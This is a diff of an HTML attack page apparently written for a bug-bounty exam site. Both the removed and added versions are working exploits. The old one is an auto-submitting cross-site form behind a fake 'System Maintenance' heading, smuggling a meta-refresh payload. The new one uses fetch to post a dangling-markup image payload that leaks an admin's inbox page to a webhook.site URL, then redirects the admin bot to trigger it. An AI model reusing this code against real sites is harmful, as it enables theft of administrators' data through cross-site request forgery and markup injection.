@@ -1,19 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>System Maintenance - Please Wait</h1>
-    <form id="exploit" action="https://api-bugbounty-exam.hashacademy.co/api/contact/submit" method="POST" enctype="text/plain">
-        <input type="hidden" name='{"name":"test","email":"jikuxn9@gmail.com","subject":"Urgent: Session Verification","message":"<meta http-equiv=\"refresh\" content=\"0;url=https://webhook.site/580abe3d-f0f3-4055-9599-b52cf52f5ff6?exfil=SECRET\">","category":"general","priority":"medium","ignore":"' value='"}'>
-    </form>
-
     <script>
-        // Submit the form automatically
-        document.getElementById('exploit').submit();
-        
-        // After 2 seconds, redirect the admin to the inbox so they see the message
-        setTimeout(() => {
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
-        }, 2000);
+        const webhook = "https://webhook.site/580abe3d-f0f3-4055-9599-b52cf52f5ff6";
+        const target = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
+
+        // This payload uses an <img> tag with an open 'src'. 
+        // When the admin views the message, the browser tries to load 
+        // your webhook URL + everything else on the page as part of the URL.
+        const payload = {
+            "name": "test",
+            "email": "jikuxn9@gmail.com",
+            "subject": "Urgent",
+            "message": `<img src="${webhook}/leak?data=`,
+            "category": "general",
+            "priority": "medium"
+        };
+
+        fetch(target, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            // Redirect the bot to the inbox to trigger the load
+            setTimeout(() => {
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
+            }, 1000);
+        });
     </script>
 </body>
 </html>
